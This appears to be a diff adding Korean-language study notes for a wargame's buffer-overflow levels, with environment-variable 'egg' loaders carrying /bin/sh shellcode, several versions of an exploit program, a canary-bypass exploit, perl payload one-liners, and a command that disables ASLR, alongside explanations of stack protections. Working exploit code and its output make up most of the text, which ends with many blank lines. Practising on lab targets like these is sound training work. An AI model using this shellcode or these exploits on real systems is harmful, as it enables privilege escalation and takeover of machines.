+        				superSH[supershLen - 1] = '\0';
+				
+        				memcpy(superSH, "EGG=", 4);
+        				putenv(superSH);
+				
+        				system("/bin/bash");
+				}
+			$ gcc -o egg egg2.c
+			$ ./egg
+			$ set 
+			$ ./getenv
+				EGG : 0xbffff4bb
+			$ vi Attack_bof.c
+				에서 쉘코드 맨 마지막줄 주소 바꾸기 
+			$ ./Attack_bof.c
+				id
+				my-pass
+	
+	[실습] 패치된 Attack_bof.c 파일
+		$ vi Attack_bof2.c
+			/* header */
+			#include <stdio.h>
+			#include <string.h>
+			#include <stdlib.h>
+
+			/* global */
+			#define NOP 0x90
+			char RET[] = "\xb8\xfa\xff\xbf";
+
+			/* function */
+
+			/* main function */
+			/* Attack method : (perl -e 'print "A"*268,RET[]'; cat) | /home/level2/attackme */
+			int main()
+			{
+    			int retLen;
+    			char shellbuf[272];
+    			int i,j ;
+    			char cmdbuf[350];
+
+    			retLen = strlen(RET);
+    			for(i=0; i<sizeof(shellbuf)-retLen; i++)
+        			shellbuf[i] = NOP;
+    			for(j=0; j<retLen; j++)
+        			shellbuf[i++] = RET[j];
+			//  printf("%s\n", shellbuf);
+			
+    			sprintf(cmdbuf, "(perl -e \'print\"");
+    			strcat(cmdbuf, shellbuf);
+    			strcat(cmdbuf, "\"\'; cat) | /home/level12/attackme");
+			//  printf("%s\n", cmdbuf);
+    			system(cmdbuf);
+			
+    			return 0;
+			}
+		$ ./egg2.c
+		$ ./getenv
+			EGG : 0xbffff4cc
+		$ vi Attack_bof2.c 
+			char RET[] = "\xcc\xf4\xff\xbf";	바꾸기 
+		$ ./Attack_bof2
+			$ id
+			$ my-pass
+		-> 문제점 계속 주소를 수동으로 바꿔줘야함 getenv를 써서
+	
+	[실습] 두번째 패치된 Attack_bof2.c 파일
+		$ vi Attack_bof2.c			/* Attack method : (perl -e 'print "A"*268,RET[]'; cat) | /home/level2/attackme */
+			/* header */
+			#include <stdio.h>
+			#include <string.h>
+			#include <stdlib.h>
+
+			/* global */
+			#define NOP 0x90
+			char RET[4];
+
+			/* function */
+
+			/* main function */
+			int main()
+			{
+        			int retLen;
+        			char shellbuf[272];
+        			int i,j ;
+        			char cmdbuf[350];
+        			char *env_pointer=NULL;
+        			unsigned long env_add_long=0x0;
+        			char ReturnAddress[9];
+        			char First[3];
+        			char Second[3];
+        			char Third[3];
+        			char Forth[3];
+
+        			env_pointer=getenv("EGG");
+        			env_add_long=(unsigned long)env_pointer;
+			//      printf("Hex : %lx\n",env_add_long);
+        			sprintf(ReturnAddress, "%lx", env_add_long);
+			//      printf("Str : %s\n", ReturnAddress);
+			//      printf("%c, %c \n",ReturnAddress[0], ReturnAddress[1]);
+
+			        First[0]=ReturnAddress[6];
+        			First[1]=ReturnAddress[7];
+        			First[2]='\0';
+			//              printf("%s\n", First);
+        			Second[0]=ReturnAddress[4];
+        			Second[1]=ReturnAddress[5];
+        			Second[2]='\0';
+			//              printf("%s\n", Second);
+        			Third[0]=ReturnAddress[2];
+        			Third[1]=ReturnAddress[3];
+        			Third[2]='\0';
+			//              printf("%s\n", Third);
+        			Forth[0]=ReturnAddress[0];
+        			Forth[1]=ReturnAddress[1];
+        			Forth[2]='\0';
+			//              printf("%s\n", Forth);
+			
+        			RET[0]=strtol(First, NULL, 16);
+        			RET[1]=strtol(Second, NULL, 16);
+        			RET[2]=strtol(Third, NULL, 16);
+        			RET[3]=strtol(Forth, NULL, 16);
+        			RET[4]='\0';
+			
+        			retLen = strlen(RET);
+        			for(i=0; i<sizeof(shellbuf)-retLen; i++)
+                			shellbuf[i] = NOP;
+        			for(j=0; j<retLen; j++)
+                			shellbuf[i++] = RET[j];
+			//      printf("%s\n", shellbuf);
+			
+        			sprintf(cmdbuf, "(perl -e \'print\"");
+        			strcat(cmdbuf, shellbuf);
+        			strcat(cmdbuf, "\"\'; cat) | /home/level12/attackme");
+			//      printf("%s\n", cmdbuf);
+        			system(cmdbuf);
+			
+        			return 0;
+			}
+			(문제: 실행전에 항상 재 컴파일) 
+			(문제: 쓸데 없는 구문 포함됨)
+	
+	[실습] 세번째 패치된 Attack_bof4.c 프로그램
+		$ vi Attack_bof4.c
+			/* header */
+			#include <stdio.h>
+			#include <string.h>
+			#include <stdlib.h>
+
+			/* global */
+			#define NOP 0x90
+			char RET[4];
+
+			/* function */
+			ConvertReturnAddress(char ReturnAddress[])
+			{
+    			char First[3];
+    			char Second[3];
+    			char Third[3];
+    			char Forth[3];
+
+    			First[0]=ReturnAddress[6];
+    			First[1]=ReturnAddress[7];
+    			First[2]='\0';
+			//      printf("%s\n", First);
+    			Second[0]=ReturnAddress[4];
+    			Second[1]=ReturnAddress[5];
+    			Second[2]='\0';
+			//      printf("%s\n", Second);
+    			Third[0]=ReturnAddress[2];
+    			Third[1]=ReturnAddress[3];
+    			Third[2]='\0';
+			//      printf("%s\n", Third);
+    			Forth[0]=ReturnAddress[0];
+    			Forth[1]=ReturnAddress[1];
+    			Forth[2]='\0';
+			//      printf("%s\n", Forth);
+			
+    			RET[0]=strtol(First, NULL, 16);
+    			RET[1]=strtol(Second, NULL, 16);
+    			RET[2]=strtol(Third, NULL, 16);
+    			RET[3]=strtol(Forth, NULL, 16);
+    			RET[4]='\0';
+			}
+			
+			/* main function */
+			int main()
+			{
+        			int retLen;
+        			char shellbuf[272];
+        			int i,j ;
+        			char cmdbuf[350];
+        			char *env_pointer=NULL;
+        			unsigned long env_add_long=0x0;
+        			char ReturnAddress[9];
+			
+        			env_pointer=getenv("EGG");
+        			env_add_long=(unsigned long)env_pointer;
+			//      printf("Hex : %lx\n",env_add_long);
+        			sprintf(ReturnAddress, "%lx", env_add_long);
+			//      printf("Str : %s\n", ReturnAddress);
+			//      printf("%c, %c \n",ReturnAddress[0], ReturnAddress[1]);
+			
+        			ConvertReturnAddress(ReturnAddress);
+			
+        			retLen = strlen(RET);
+        			for(i=0; i<sizeof(shellbuf)-retLen; i++)
+                			shellbuf[i] = NOP;
+        			for(j=0; j<retLen; j++)
+                			shellbuf[i++] = RET[j];
+			//      printf("%s\n", shellbuf);
+			
+        			sprintf(cmdbuf, "(perl -e \'print\"");
+        			strcat(cmdbuf, shellbuf);
+        			strcat(cmdbuf, "\"\'; cat) | /home/level12/attackme");
+			//      printf("%s\n", cmdbuf);
+        			system(cmdbuf);
+			
+        			return 0;
+			}
+			-> egg쉘을 따로 실행해줘야함..
+	
+	[실습] 네번째 패치 된 Attack_bof5.c 프로그램 
+		$ cp Attack_bof4.c Attack_bof6.c 
+		$ gcc -o Attack_bof6 Attack_bof6.c
+		$ cp egg2.c Attack_bof5.c
+		$ vi Attack_bof5.c
+			#include <stdio.h>
+			#include <stdlib.h>
+			#include <unistd.h>
+
+			#define NOP 0x90
+
+			char shellcode[] =
+ 			"\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+ 			"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";
+
+			int main(int argc, char **argv)
+			{
+        			char *ptr, *superSH;
+        			int supershLen=2048;
+        			int i;
+
+        			if(!(superSH = malloc(supershLen)))
+        			{
+                			printf("Can't allocate memory for supershLen");
+                			exit(0);
+        			}
+
+        			ptr = superSH;
+        			for(i=0; i<supershLen - strlen(shellcode) - 1; i++)
+                			*(ptr++) = NOP;
+			
+        			for(i=0; i<strlen(shellcode); i++)
+                			*(ptr++) = shellcode[i];
+			
+        			superSH[supershLen - 1] = '\0';
+			
+        			memcpy(superSH, "EGG=", 4);
+        			putenv(superSH);
+			
+        			system("./Attack_bof6");		-> 핵심 
+			}
+		$ gcc -o Attack_bof5 Attack_bof5.c
+		$ ./Attack_bof5
+			공격이 완료 
+
+13. Leve13 -> Leve14
+	목적 : 메모리 보호기법 (스택가드) 에 대해서 
+		메모리보호기법 : BOF,FSB는 스택에다 16진수코드를 올리는데 이러한 코드를 막는것 ?
+		
+			리눅스
+				ASLR : 프로그램이 실행될때 마다 주소를 바꿔준다.
+					해제하는법 : echo 0 > /proc/sys/kernel/randomize_va_space
+					
+				NX(Non-Excutable) : 데이터영역에서 코드가 실행되는것을 막는 기법 ( 스택에 바이너리를 올렸을때 실행이 되지 않도록 권한을 뺌 )
+					
+				ASCII-Armor : ASCII-Armor란, 공유라이브러리 영역의 상위 주소에 0x00을 포함시키는 방법
+					주소앞에 00을 포함시키면 해당 주소는 실제주소가 아니다 따라서 볼수가 없다.
+				
+				스택 Canary : SFP와 ret정보를 저장할때 공격자에의해 덮어씌어지는것으로 부터 보호하기 위해 스택의 변수공간이랑 sfp사이에 특정한 값을 넣는데 이를 canary라 함
+				
+				스택가드 : 위와 비슷하지만 리턴값을 다른값에 read only에 보관했다가 함수가 실행될때 ret로 들어가 정상적으로 ret가 실행된다.
+			
+			윈도우
+				ASLR -> 위와 동일
+				DEP -> NX와 동일 
+				SEH -> 예외처리핸들러로 프로그램실행하고 에러가 발생하면 예외처리 함수가 실행되면 하나씩 예외처리를해본다 
+
+	[실습] Level14에 도전하기 
+		$ ls -l
+		$ cat hint
+		$ cp attackme tmp
+		$ cd tmp 
+		$ gdb -q attackme 
+			disassemble main -> 노트패드보기 
+			b *0x080484e5
+			run AAAAAAAA		-> 넣어보기 
+			x/264x $esp 			-> 이해안감	-> buf의 시작점을 알 수 있음 그리고 맨뒤에 스택가드인 12345678이 있고 8바이트 더미공간 그리고 sfp 와 ret가 있음
+			c
+			
+			r $(perl -e 'print "A"x1048')			-> 카나리 값을 바꿔봄 
+			x/264x $esp
+			continue									-> 카나리 바꾸니깐 프로그램이 종료됨 
+			quit
+		$ /home/level12/tmp/egg2				-> 쉘코드를 실행한다.
+			$ ps
+			$ set
+		$ vi getenv.c									-> 주소를 확인하기 위해 프로그램 작성
+			#include <stdlib.h>
+			main()
+			{
+    			printf("EGG: %p\n",getenv("EGG"));
+			}
+		$ gcc -o getenv getenv.c
+		$ ./getenv
+			EGG: 0xbffff4b7							-> 쉘코드 주소를 가져옴 
+		$ ./attackme $(perl -e 'print "A"x1035')
+		$ ./attackme $(perl -e 'print "A"x1036')		-> 여기까진 괜찮지만 엔터로인해 카나리값을 건들이게 된다.
+			Warnning: Buffer Overflow !!!
+		$ ./attackme $(perl -e 'print "A"x1036,"\x67\x45\x23\x01"')		-> 카나리값을 지정해줬기 때문에 괜찮다 
+		$ cd ..
+		$ ./attackme $(perl -e 'print "A"x1036,"\x67\x45\x23\x01","\xb7\xf4\xff\xbf"x4')	-> 1036에 카나리값을 지정하고 우리의 주소를 4번넣으면 해당 주소에 쉘코드가 있어 공격이 실행된다.
+	
+	[실습] 공격용 코드 개발하기 
+		$ cd tmp
+		$ vi exploit_level13.c
+			#include <stdio.h>
+			#include <stdlib.h>
+
+			#define NOP 0x90
+			#define NOP1 120
+			#define NOP2 891
+			#define BUFSIZE 1056  /* NOP(120) + shellcode(25) + NOP(891) + stackguard(4) + NOP(8) + 
+                         			SFP(4) + RET(4) */
+
+			// 변조하면 안되는 스택 가드의 값
+			char stackgd[] = "\x67\x45\x23\x01";
+
+			// 배시쉘을 실행하는 쉘코드
+			char shellcode[] = 
+			"\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+			"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";
+
+			// char str[1024] 배열의 시작 주소
+			char retAddr[] = "\xb8\xfa\xff\xbf";
+
+			int main()
+			{
+    			char cmdBuf[BUFSIZE];
+    			int i, j, k, l, stackLen, shellLen, retLen;
+
+    			// 스택 가드, 쉘코드, 리턴주소의 길이 확인
+    			stackLen = strlen(stackgd);
+    			shellLen = strlen(shellcode);
+    			retLen = strlen(retAddr);
+
+    			// 쉘코드 앞부분까지 NOP 썰매 할당
+    			for(i=0; i<NOP1; i++)
+        			cmdBuf[i] = NOP;
+
+    			// NOP 뒤에 쉘코드 할당
+    			for(j=0; j<shellLen; j++)
+        			cmdBuf[i++] = shellcode[j];
+
+    			// 나머지 공간에 NOP 할당
+    			for(j=0; j<NOP2; j++)
+        			cmdBuf[i++] = NOP;
+			
+    			// 스택 가드의 원본 덮어 쓰기
+    			for(j=0; j<stackLen; j++)
+        			cmdBuf[i++] = stackgd[j];
+			
+    			// 나머지 공간에 NOP 할당
+    			for(j=0; j<retLen*3; j++)
+        			cmdBuf[i++] = NOP;
+			
+    			// 배시 쉘코드의 주소 할당
+    			for(j=0; j<retLen; j++)
+        			cmdBuf[i++] = retAddr[j];
+			
+    			execl("/home/level13/attackme", "attackme", cmdBuf, 0);
+			}
+		$ gcc -o exploit_level13 exploit_level13.c
+		$ /home/level12/tmp/egg 300 
+		$ ./exploit_level13
+				
+14. Level14 -> Level15
+	목적 : 루틴 분기 키값의 이해 
+		루틴분기의 사용 예 설치할때 시리얼키/라이센스키 입력 받는 부분 
+	
+	[실습] Level14도전 
+		$ ls -l
+		$ cat hint
+		$ cp attackme tmp
+		$ cd tmp
+		$ gdb -q attackme
+			(perl -e 'print "A"x40, "\xef\xbe\xad\xde"';cat)|/home/level14/attackme
+		-> 스스로 풀기
+
+15. Level15 -> Level16
+	목적 : 루틴 분기 키값의 이해 2 : 포인터를 사용하는 경우 
+	
+	[실습] Level15도전	-> 위의 문제에서 deadbeef의 주소값을 넣는것임 eip이용 
+		$ ls -l
+		$ cat hint
+		$ 
+	
+		deadbeef의 주소 0x80484b2
+		-> 스스로 풀기 
+========================================밑에는 그냥 스스로 풀어보기================================
+	
+포맷스트링
+지시자중 %n 이 있는데 
+다른것은 읽어들이지만 특정한 주소안에 들어있는 값을 %n앞에들어있는 바이트카운트로 바꾼다
+
+[참고] 스택의 구조
+	------------------------------------------------------------------------------------------------+
+	10           		6          10           14          4            4    	 	4			4			 4  |
+	buf[10]    dummy   buf2[10]  	 dummy   	  SFP		  RET  	   argc  	 *argv  	    enc|
+	------------------------------------------------------------------------------------------------+
+	<--- 낮은 메모리 주소                  							높은 메모리 주소 --->
+
+	ret와 sfp는 필수고 그 뒤에는 있을수도있고 없을 수도 있음 
+	
+[참고]
+	레이스컨디션		-> 정보 획득 = 임시파일이 고정이름으로 생기면 일어나는 것
+	포맷스트링 		-> 권한 상승 = 잘못된 변수선언으로 생김 
+	버퍼오버플로우	-> 권한 상승 = 최근에 이용되는 것 (프로그래머의 잘못으로 인해 생기는 것)
+												 배열선언 ex) a[30] 하면 0부터 29번까지 30개가 만들어지는데 30이라고 써져있어서 오버플로우된다.
+맑은고딕!
+
+두전네트 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
